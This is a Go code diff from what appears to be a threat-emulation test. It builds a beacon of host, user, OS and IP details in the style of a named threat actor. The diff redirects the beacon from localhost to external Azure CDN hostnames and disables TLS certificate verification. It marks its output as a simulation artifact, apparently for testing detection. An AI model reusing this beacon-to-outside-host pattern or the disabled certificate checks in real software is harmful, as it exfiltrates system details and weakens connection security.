@@ -16,6 +16,7 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"crypto/sha256"
+	"crypto/tls"
 	"encoding/base64"
 	"fmt"
 	"io"
@@ -80,7 +81,7 @@ func performTechnique() error {
 
 	// Format metadata like the threat actor beacon structure
 	beaconPayload := fmt.Sprintf(
-		"host=%s|user=%s|computer=%s|os=%s|ip=%s|time=%s|agent=RobotDreams-1.0|campaign=GulfSecAlert",
+		"host=%s|user=%s|computer=%s|os=%s|ip=%s|time=%s|agent=RobotDreams-1.0|campaign=GulfSecAlert|marker=F0RT1KA_SIMULATION_ARTIFACT_NOT_REAL_MALWARE",
 		hostname, username, computerName, osVersion, ipAddr, timeNow,
 	)
 
@@ -123,19 +124,23 @@ func performTechnique() error {
 		desc string
 	}{
 		{
-			url:  "https://127.0.0.1:443/api/update",
+			url:  "https://f0rt1ka-test.azurefd.net/api/update",
 			host: "f0rt1ka-test.azurefd.net",
 			desc: "Azure Front Door CDN endpoint (HTTPS/443)",
 		},
 		{
-			url:  "https://127.0.0.1:8443/beacon",
+			url:  "https://f0rt1ka-cdn.azureedge.net/beacon",
 			host: "f0rt1ka-cdn.azureedge.net",
-			desc: "Azure CDN Edge endpoint (HTTPS/8443)",
+			desc: "Azure CDN Edge endpoint (HTTPS/443)",
 		},
 	}
 
 	httpClient := &http.Client{
-		Timeout: 5 * time.Second,
+		Timeout: 8 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
+			TLSHandshakeTimeout: 5 * time.Second,
+		},
 	}
 
 	c2AttemptsLogged := 0
